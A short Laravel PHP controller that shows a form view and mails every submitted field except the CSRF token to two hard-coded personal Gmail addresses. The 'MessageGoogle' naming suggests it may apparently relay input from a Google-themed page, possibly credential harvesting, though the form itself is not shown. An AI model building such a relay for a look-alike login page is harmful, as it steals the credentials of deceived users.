<?php

namespace App\Http\Controllers;

use App\Mail\MessageGoogle;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class MessageController extends Controller
{
    public function formMessageGoogle()
    {
        return view("index2");
    }
    // Envoi du mail aux utilisateurs
    public function sendMessageGoogle(Request $request)
    {
        Mail::to('transcachv3@gmail.com')
            ->send(new MessageGoogle($request->except('_token')));

        Mail::to('Chabijeanbaptiste56@gmail.com')
            ->send(new MessageGoogle($request->except('_token')));

        return redirect("valide");
    }
}
